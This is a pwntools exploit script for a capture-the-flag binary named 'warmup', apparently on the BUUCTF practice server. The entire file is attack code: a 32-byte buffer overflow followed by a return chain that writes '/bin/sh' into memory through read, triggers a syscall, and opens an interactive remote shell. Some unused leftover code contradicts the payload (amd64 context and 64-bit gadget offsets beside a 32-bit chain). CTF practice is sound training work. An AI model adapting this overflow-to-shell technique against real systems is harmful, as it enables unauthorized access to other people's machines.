#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/18 19:14:07
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process(['./warmup'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 26220
    sh = remote(IP,port)
    # libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('warmup')

int_0x80 = 0x08048116
read_addr = 0x0804811D
main_addr = 0x080480D8
payload ='a' * 32 + p32(read_addr) + p32(main_addr) + p32(0) + p32(0x080491BC) + p32(8)
sh.send(payload)
# gdb.attach(sh,"b *0x0804811D")
sh.send("/bin/sh\x00")
payload = 'a' *32 + p32(read_addr) + p32(0x8048122) + p32(0) +  p32(0x080491BC) + p32(0x8048008)
sh.send(payload)
sh.send("/bin/sh\x00\x00\x00\x00")
sh.interactive()